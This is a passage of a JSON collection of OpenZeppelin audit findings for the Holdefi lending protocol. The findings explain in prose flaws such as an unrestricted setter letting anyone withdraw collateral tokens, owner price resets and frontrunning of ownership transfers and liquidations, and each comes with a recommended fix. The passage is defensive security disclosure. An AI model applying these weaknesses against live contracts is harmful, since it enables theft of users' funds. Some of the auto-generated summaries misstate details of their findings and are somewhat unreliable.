      "content": "The Holdefi platform uses [the `CollateralsWallet` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/CollateralsWallet.sol) to store the collateral assets of the project. There, the contract implements functionalities such as [withdrawing the collaterals](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/CollateralsWallet.sol#L20) or accepting ETH through the [payable fallback function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/CollateralsWallet.sol#L33). To restrict who can call these functions, the callers address with [the `holdefiContract` address](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/CollateralsWallet.sol#L11) is compared.\n\n\nMeanwhile, [the `Holdefi` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol) allows users to deposit assets as collaterals to then increase their collateral balance which allows them to borrow other assets of the platform.\n\n\nIn particular, if someone deposits ETH, the user has to call [the `collateralize` payable function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L248) while sending the amount of ETH they want to add in the same transaction. Once [the `Holdefi` contract checks if the ETH market is active](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L252), it transfers the ETH to [the `CollateralsWallet` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/CollateralsWallet.sol) and stores the balance in an internal mapping.\n\n\nThe method used to transfer the ETH to [the `CollateralsWallet` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/CollateralsWallet.sol) is a [low level call](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L254), which is the current correct way to transfer ETH between addresses due to the fact that the `transfer` method relies on the fact that gas costs are always constant, but since [the Istanbul hard fork](https://eips.ethereum.org/EIPS/eip-1679), these gas prices cannot be considered constants and contracts that use them may break in the future.\n\n\nNevertheless, in all other ETH transfers to external accounts or other contracts, the `transfer` method is used. Some examples are the ones in [L214](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L214), [L325](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L325), [L397](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L397), and [L778](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L778) from the `Holdefi` contract.\n\n\nConsider using the low level call to send ETH as it was implemented in [L254-L255](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L254-L255) or, even better, replacing all the current implementations to send ETH with the [OpenZeppelins `sendValue` method](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.1/contracts/utils/Address.sol#L63).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10947",
      "title": "[M11] Missing docstrings",
      "impact": "MEDIUM",
      "content": "All the contracts and functions in the [Holdefis codebase](https://github.com/holdefi/Holdefi/tree/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts) lack documentation. This hinders reviewers understanding of the codes intention, which is fundamental to correctly assess not only security, but also correctness.\n\n\nAdditionally, docstrings improve readability and ease maintenance. They should explicitly explain the purpose or intention of the functions, the scenarios under which they can fail, the roles allowed to call them, the values returned, and the events emitted.\n\n\nConsider thoroughly documenting all functions (and their parameters) that are part of the contracts public API. Functions implementing sensitive functionality, even if those are not public, should be clearly documented as well. When writing docstrings, consider following the [Ethereum Natural Specification Format (NatSpec)](https://solidity.readthedocs.io/en/develop/natspec-format.html).\n\n\n**Update**: *Not fixed. Holdefis statement for this issue:*\n\n\n\n> This is not a bug. This is just a suggestion\n> \n>",
      "summary": "\nThis bug report is about the lack of documentation in the Holdefi codebase. This lack of documentation makes it difficult for reviewers to understand the code and assess its security and correctness. The report suggests that all functions in the contracts should be thoroughly documented, including those that are part of the public API and those that are not. It also suggests that the Ethereum Natural Specification Format (NatSpec) should be followed when writing the docstrings. Holdefi's statement about this issue is that it is not a bug, but rather a suggestion.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10946",
      "title": "[M10] Lack of events emission after sensitive actions",
      "impact": "MEDIUM",
      "content": "Throughout the [Holdefi project codebase](https://github.com/holdefi/Holdefi/tree/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts), there are several cases where sensitive actions are performed but there are no events being emitted, or the existent emitted events miss important parameters.  \n\nOur suggestions are:\n\n\nIn the `CollateralsWallet` contract:  \n\n The [`withdraw` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/CollateralsWallet.sol#L20) should emit a `CollateralAssetWithdrawn` event  \n\n The [fallback function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/CollateralsWallet.sol#L33) should emit a `TransferReceived` event\n\n\nIn the `Holdefi` contract:  \n\n The [`updatePromotionReserve` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L569) should emit a `PromotionReseveUpdated` event  \n\n The [`withdrawLiquidationReserve` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L700) should emit a `LiquidationReserveWithdrawn` event  \n\n The [`withdrawPromotionReserve` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L760) should emit a `PromotionReserveWithdrawn` event  \n\n The [`UpdateBorrowIndex`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L566) event should print the `borrowRate` received by the `getCurrentInterestIndex` function\n\n\nIn the `HoldefiPauser` contract:  \n\n The [`pause` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L55) should emit a `OperationPaused`event  \n\n The [`unpause` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L60) should emit a `OperationUnaused` event  \n\n The [`setPauser` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L82) should emit a `PauserSet` event  \n\n The [`setPauseDuration` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L86) should emit a `PauseDurationSet` event\n\n\nIn the `Ownable` contract, the [constructor](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Ownable.sol#L14) should emit an `OwnershipTransferred` event\n\n\nIn the `HoldefiPrices` contract, the [`addStableCoin` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPrices.sol#L47) should emit a `StablecoinAdded` event\n\n\nAs a general rule, consider emitting events appropriately when performing sensitive changes to storage variables, and consider emitting the most important variables involved in those changes.",
      "summary": "\nThis bug report is about the Holdefi project codebase. There are several cases where no events are emitted when sensitive actions are performed. The report suggests that certain functions in CollateralsWallet, Holdefi, HoldefiPauser, Ownable, and HoldefiPrices contracts should emit events. \n\nFor example, the 'withdraw' function in the CollateralsWallet contract should emit a 'CollateralAssetWithdrawn' event, and the 'updatePromotionReserve' function in the Holdefi contract should emit a 'PromotionReseveUpdated' event. Additionally, the 'UpdateBorrowIndex' event should print the 'borrowRate' received by the 'getCurrentInterestIndex' function. \n\nThe report also suggests that, as a general rule, events should be emitted when performing sensitive changes to storage variables, and the most important variables involved in those changes should also be emitted.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10945",
      "title": "[M09] Not using OpenZeppelin contracts",
      "impact": "MEDIUM",
      "content": "[OpenZeppelin maintains a library of standard, audited, community-reviewed, and battle-tested smart contracts](https://github.com/OpenZeppelin/openzeppelin-contracts/tree/v2.5.0).  \n\nInstead of always importing these contracts, the Holdefi project reimplements them in some cases, while in other cases it just copies them.\n\n\nThis increases the amount of code that the Holdefi team will have to maintain and misses all the improvements and bug fixes that the OpenZeppelin team is constantly implementing with the help of the community.\n\n\nIn particular, the following contracts and libraries are being reimplemented or copied:\n\n\n* [the `Ownable` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Ownable.sol) can be replaced with the [OpenZeppelins `Ownable` contract](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/ownership/Ownable.sol)\n* [the `SafeMath` library](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/SafeMath.sol) can be replaced with the [OpenZeppelins `SafeMath` library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol)\n* The `ERC20` interface defined in [line 3](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/CollateralsWallet.sol#L3) of `CollateralsWallet.sol` and [line 25](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L25) of `Holdefi.sol` can be replaced with the [OpenZeppelins `IERC20.sol` interface](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/token/ERC20/IERC20.sol)\n\n\nConsider importing the OpenZeppelin contracts instead of reimplementing or copying them. These contracts can be extended to add the extra functionalities required by Holdefi.  \n\nConsider always using the full ERC interfaces so that obviously non-compliant implementations can be easily excluded.  \n\nConsider updating the library to its [latest stable version for Solidity 0.5.16](https://github.com/OpenZeppelin/openzeppelin-contracts/tree/v2.5.0).\n\n\n**Update**: *Not fixed. Holdefis statement for this issue:*\n\n\n\n> If we use exactly OpenZeppelin contracts, we will miss some added features like ownerChanger. But we need them and cant remove them. For ERC20 interface, we dont need all functions so web just use a reduced version of IERC20.sol interface.\n> \n> \n\n\n*We have updated our suggestion to make it clearer.*",
      "summary": "\nThe Holdefi project is reimplementing or copying some contracts and libraries from OpenZeppelin, a library of standard, audited, community-reviewed, and battle-tested smart contracts. This increases the amount of code that the Holdefi team will have to maintain and misses out on improvements and bug fixes that the OpenZeppelin team is constantly implementing. Examples of such contracts and libraries include the `Ownable` contract, the `SafeMath` library, and the `ERC20` interface.\n\nIt is suggested that the Holdefi project imports the OpenZeppelin contracts instead of reimplementing or copying them, as they can be extended to add the extra functionalities that are required. It is also suggested that the Holdefi project uses the full ERC interfaces so that obviously non-compliant implementations can be easily excluded. Lastly, the OpenZeppelin library should be updated to its latest stable version for Solidity 0.5.16.\n\nThe Holdefi team has provided a statement regarding this issue, saying that if they use exactly OpenZeppelin contracts, they will miss some added features like ownerChanger, and that they don't need all functions of the ERC20 interface, so they just use a reduced version of IERC20.sol interface. The suggestion has been updated to make it clearer.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10944",
      "title": "[M08] Excessive indirection",
      "impact": "MEDIUM",
      "content": "Due to the massive factorization of certain behaviors under the same function as addressed in the issue *[L08] Overcomplicated return values*, the level of indirection present severely degrades the readability of the code.\n\n\nTo give an example, if a liquidator calls [the `liquidateBorrowerCollateral` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L429) of the `Holdefi` contract, that same transaction would end up triggering a call to [the `clearDebts` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L403), which then would call [the `updateSupplyIndex` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L550), which would call afterwards [the `getCurrentInterestIndex` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L507), and finally jump to the `HoldefiSettings` contract to call [the `getInterests` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L100).\n\n\nRight after the `updateSupplyIndex` call ends, [the `updatePromotionReserve`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L569) would be called, which would call [the `getCurrentPromotion` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L525), and would end up jumping again to the `HoldefiSettings` contract to call [the `getInterests` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L100).\n\n\nNote that the example of excessive indirection mentioned above is not the only one triggered by the `liquidateBorrowerCollateral` function, but just one of many.\n\n\nWhile this does not pose a security risk per se, it introduces a lot of complexity to important sections of the code, is error prone and difficult to maintain in the long term.\n\n\nConsider reducing excessive indirections throughout the code base by simplifying each function, so that they can fulfill one single and clear purpose, and also avoid over-factorizing behaviors in order to improve the readability and maintenance of the project. If there is a reason or limitation that forces this complexity, consider documenting it in the code.\n\n\n**Update**: *Not fixed. Holdefis statement for this issue:*\n\n\n\n> As you mentioned, this does not pose a security risk per se. And its not a medium severity issue. Its just a suggestion.  \n> \n> Also, we can use the limited number of values in each function. If we want to simplify functions, we are faced with this error: Stack too deep, try removing local variables.\n> \n> \n\n\n*We have updated our suggestion to make it clearer.*",
      "summary": "\nThis bug report is about the \"Overcomplicated return values\" issue in the Holdefi codebase. The issue is that the code has a high level of indirection which makes it difficult to read and maintain. An example is given of a liquidator calling the `liquidateBorrowerCollateral` function which then triggers a call to the `clearDebts` function, which then triggers a call to `updateSupplyIndex` and so on. It is noted that this is not the only example of excessive indirection in the code, but just one of many. This issue does not pose a security risk but it does make the code more complex and difficult to maintain. The suggestion is to reduce the excessive indirection by simplifying each function so that it can fulfill one single and clear purpose. Additionally, if there is a reason or limitation that forces the complexity, it should be documented in the code. Holdefi has provided an update to the suggestion, noting that they can use the limited number of values in each function. If they want to simplify functions, they are faced with the error of \"Stack too deep, try removing local variables\".",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10943",
      "title": "[M07] Old owner can frontrun the ownerChanger",
      "impact": "MEDIUM",
      "content": "The [`Ownable` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Ownable.sol) is a modified version of [the OpenZepplin `Ownable` contract](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58a3368215581509d05bd3ec4d53cd381c9bb40e/contracts/ownership/Ownable.sol) where a third actor is included: [the `ownerChanger`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Ownable.sol#L6).\n\n\nThe `ownerChanger` is can accept an ownership transfer from the old owner to the [`pendingOwner`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Ownable.sol#L7).\n\n\nFirst, to perform a successful ownership transfer, the old `owner` needs to [call the `transferOwnership` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Ownable.sol#L26) passing the address of the new desired owner, and then the `ownerChanger` needs to accept it by [calling the `acceptTransferOwnership` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Ownable.sol#L34).\n\n\nA scenario could happen in which the old owner A tries to deceive the `ownerChanger` by calling [the `transferOwnership` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Ownable.sol#L26) with the address of the new owner B, address that the `ownerChanger` would approve, but right after the `ownerChanger` sends the transaction calling [the `acceptTransferOwnership` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Ownable.sol#L34), the old owner A calls [the `transferOwnership` function again](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Ownable.sol#L26) with a higher gasPrice and passing another address C as the parameter. In that case, this last transaction would be mined first and just after that [the `acceptTransferOwnership` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Ownable.sol#L34) would confirm the ownership transfer to the undesired address C.\n\n\nAlthough it is very unlikely that the old owner would perform such attack, consider changing [the `acceptTransferOwnership` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Ownable.sol#L34) to ask the `ownerChanger` the address of the new owner so it can be compared to the `pendingOwner` submitted by the old owner.",
      "summary": "\nThis bug report is about the Ownable contract, a modified version of the OpenZepplin Ownable contract. In this version, a third actor, the ownerChanger, is included. The ownerChanger is able to accept an ownership transfer from the old owner to the pendingOwner. To successfully transfer ownership, the old owner must call the transferOwnership function with the address of the new owner, and then the ownerChanger must call the acceptTransferOwnership function.\n\nHowever, a scenario could happen in which the old owner tries to deceive the ownerChanger by calling the transferOwnership function with the address of a new owner, which the ownerChanger would approve, but then the old owner calls the transferOwnership function again with a higher gasPrice and passes a different address as the parameter. In this case, this last transaction would be mined first and the acceptTransferOwnership function would confirm the ownership transfer to the undesired address.\n\nTo avoid this scenario, it is suggested that the acceptTransferOwnership function be changed to ask the ownerChanger the address of the new owner so it can be compared to the pendingOwner submitted by the old owner.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [
        "Front-Running"
      ],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10942",
      "title": "[M06] Markets can become insolvent",
      "impact": "MEDIUM",
      "content": "When the value of all collateral is worth less than the value of all borrowed assets, we say a market is insolvent. The [Holdefi codebase](https://github.com/holdefi/Holdefi/tree/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts) can do many things to reduce the risk of market insolvency, including: prudent selection of collateral-ratios, incentivizing third-party collateral liquidation, careful selection of which tokens are listed on the platform, etc. However, the risk of insolvency cannot be entirely eliminated, and there are numerous ways a market can become insolvent, for instance:\n\n\n* The price of the underlying (or borrowed) asset makes a big, quick move during a time of high network congestion  resulting in the market becoming insolvent before enough liquidation transactions can be mined. A similar situation was experienced at the beginning 2020 in the Ethereum network, and specially in [Makers pricing oracles](https://www.coindesk.com/makerdao-debts-grow-as-defi-leader-moves-to-stabilize-protocol).\n* The liquidation incentives are not as strong they should be, allowing the accumulation of under-collateralized borrows.\n* The price oracle temporarily goes offline during a time of high market volatility. This could result in the oracle not updating the asset prices until after the market has become insolvent. In this case, there will never have been an opportunity for liquidation to occur.\n* The admin or oracle steals enough collateral that the market becomes insolvent.\n* Administrators list an ERC20 token with a later-discovered bug that allows minting tokens arbitrarily. This potentially corrupt tokens can be used as collateral to borrow funds that were never intended to be used as a repayment.\n\n\nIn any case, the effects of an insolvent market could be disastrous. It may result in a run on the bank situation, with the last suppliers out losing their money.\n\n\nThis risk is not unique to the Holdefi project. All collateralized loans (even non-blockchain loans) have a risk of insolvency. However, it is important to know that this risk does exist, and that it can be difficult to recover from even a small dip into insolvency.\n\n\nConsider adding more targeted tests for these scenarios to better understand the behavior of the protocol, and designing relevant mechanics to make sure the platform operates properly. Also consider communicating the potential risks to the users if needed.",
      "summary": "\nHoldefi is a decentralized platform that facilitates collateralized loans. While the codebase has many safeguards to reduce the risk of market insolvency, it is still possible for a market to become insolvent due to various reasons. These include a big, quick move of the underlying asset's price during a time of high network congestion, insufficient liquidation incentives, oracle going offline, administrators listing a token with a bug, and admin or oracle stealing enough collateral. Such an event could result in a run on the bank situation, with the last suppliers out losing their money. It is important to consider adding more targeted tests for these scenarios, designing relevant mechanics, and communicating the potential risks to the users.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10941",
      "title": "[M05] Asset price can be reset by owner",
      "impact": "MEDIUM",
      "content": "The [`addStableCoin` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPrices.sol#L47) of the `HoldefiPrices` contract is used to introduce new token prices to the Holdefi system with an initial price of [`priceDecimal`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPrices.sol#L16), that will later be used for performing sensible operations such as [withdrawing collaterals](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L270), [borrowing market assets](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L308), and [liquidating a borrowers collateral](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L434) on the `Holdefi` contract.\n\n\nThe problem resides in that the `addStableCoin` function does not check whether an asset has already been added to the system or not, leading to scenarios where the owner of the contract could reset its value by calling this function multiple times, overwriting the current price of a given asset with the initial `priceDecimal` value.\n\n\nConsider checking whether a given asset price has already been added to the system by checking its existence in the [`assetPrices` mapping](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPrices.sol#L47) before calling the `setPrice` function inside the `addStableCoin` function.",
      "summary": "\nThe HoldefiPrices contract has a function called 'addStableCoin' which is used to introduce new token prices to the Holdefi system. This function sets the initial price of the token to the value of 'priceDecimal' which is later used for operations such as withdrawing collaterals, borrowing market assets, and liquidating a borrower's collateral on the Holdefi contract. \n\nThe problem is that the 'addStableCoin' function does not check if an asset has already been added to the system, leading to scenarios where the owner of the contract can reset the value by calling this function multiple times and overwriting the current price of a given asset with the initial 'priceDecimal' value. \n\nTo fix this issue, it is suggested to check if a given asset price has already been added to the system by checking its existence in the 'assetPrices' mapping before calling the 'setPrice' function inside the 'addStableCoin' function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10940",
      "title": "[M04] Insufficient incentives to liquidator",
      "impact": "MEDIUM",
      "content": "The [`Holdefi` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol) implements the [liquidation process](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L429) for those accounts that may have an [under-collateralized balance or that may have been inactive for a whole year](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L432) without interacting with the project.\n\n\nThe liquidation process is a very important part of every DeFi project because it allows to extinguish the problem of having the whole system under-collateralized under critical conditions of the market, and it needs a design that incentivizes its speed of execution.\n\n\nNevertheless, the only incentive that a liquidator has when calling [the `liquidateBorrowerCollateral` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L429) is to update its [last time of activity](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L447). Not only that, but also it only updates the latest activity time for the collateral type involved in the liquidation process and not all the activity times of all collaterals. Liquidators that do not have the collateral involved in the contract, or any collateral at all, will not have any benefit for calling the liquidation process.\n\n\nFurthermore, given that the cost of calling [the `liquidateBorrowerCollateral` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L429) will be high due to the `for` loop in [the `clearDebts` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L410), as it was pointed out in the issue **[M02] List of markets can endlessly grow**, and even though buying discounted collateral assets could be considered as an incentive to the liquidators, the liquidators have a low incentive to reduce the liquidable accounts borrows of the platform. This is because the account liquidation process is detached from the liquidated-collateral asset purchase, making that between those function calls, a third party could front-run the transaction from the liquidator that calls [the `buyLiquidatedCollateral` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L464), by increasing the gas price, just after the transaction to the`liquidateBorrowerCollateral` function was mined. That way, the liquidator would end up paying for the expensive liquidation process, without receiving any benefit.\n\n\nConsider improving the incentive design to give the liquidators higher incentives to execute the liquidation process, or merging the functionalities from the `liquidateBorrowerCollateral` and the `buyLiquidatedCollateral` functions under one.\n\n\n**Update**: *Not fixed. Holdefis statement for this issue:*\n\n\n\n> A 5% discount for buying collateral assets can incentivize the liquidator to liquidate collaterals and then buy it.\n> \n> \n\n\n*We have updated our suggestion to make it clearer.*",
      "summary": "\nThe Holdefi contract implements a liquidation process for accounts that may have an under-collateralized balance or that may have been inactive for a whole year. This process is important to prevent the system from becoming under-collateralized in critical market conditions. However, the current incentive design does not provide enough motivation for liquidators to reduce the borrows of the platform. Furthermore, the liquidation process is not connected to the purchase of the liquidated collateral asset, meaning that a third party can buy it before the liquidator does, leaving the liquidator with no benefit. \n\nHoldefi suggests offering a 5% discount for buying the collateral asset to incentivize the liquidator to liquidate the collaterals and then buy them. This suggestion has been updated to make it clearer.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10939",
      "title": "[M03] Anyone can set the Holdefi contracts address in the CollateralsWallet contract",
      "impact": "MEDIUM",
      "content": "The [`CollateralsWallet` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/CollateralsWallet.sol) is in charge of letting the [`Holdefi` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol) to withdraw a collateral asset if needed through the [`withdraw` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/CollateralsWallet.sol#L20). For this, the [`holdefiContract` storage variable](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/CollateralsWallet.sol#L11) must be set first through the [`setHoldefiContract` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/CollateralsWallet.sol#L14), which is independent from the `CollateralsWallet` contract creation.\n\n\nThe problem resides in the fact that the [`setHoldefiContract` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/CollateralsWallet.sol#L14) does not have any restriction and can be called by any address and, thus, the [`holdefiContract` storage value](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/CollateralsWallet.sol#L11) can be set by any external actor right after the contract creation, and will be able to call the `withdraw` function afterwards and steal the tokens held by the `CollateralsWallet` contract in any ERC20 contract, if there are any in the first place.\n\n\nConsider setting the `holdefiContract` storage variable on the contract creation instead of setting it in a separate function, or consider using the `Ownable` contract for setting an owner of the `CollateralsWallet` contract so the `setHoldefiContract` can only be called by a trusted actor.",
